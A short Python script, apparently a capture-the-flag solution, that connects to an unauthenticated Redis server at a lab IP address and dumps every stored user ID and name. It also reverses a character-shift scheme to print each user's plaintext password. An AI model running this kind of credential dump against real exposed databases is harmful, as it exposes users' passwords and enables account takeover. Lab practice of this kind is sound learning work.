#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Made by papi
# Created on: Wed 17 Mar 2021 04:54:34 PM CET
# db_dump.py
# Description:
import redis

def password(id):
    index = 0
    string = []
    while index < len(id):
        if id[index] == ')':
            string.append("A")
        else:
            string.append(chr(ord(id[index]) - 9))
        index += 1
    return "".join(string)

r = redis.Redis("10.10.11.143", 6379)
keys = r.keys("*")
pair = []

print("user_id,name,password")
for key in keys:
    name = r.get(key).decode("utf-8")
    id = key.decode("utf-8")
    print(id + "," + name + "," + password(id))

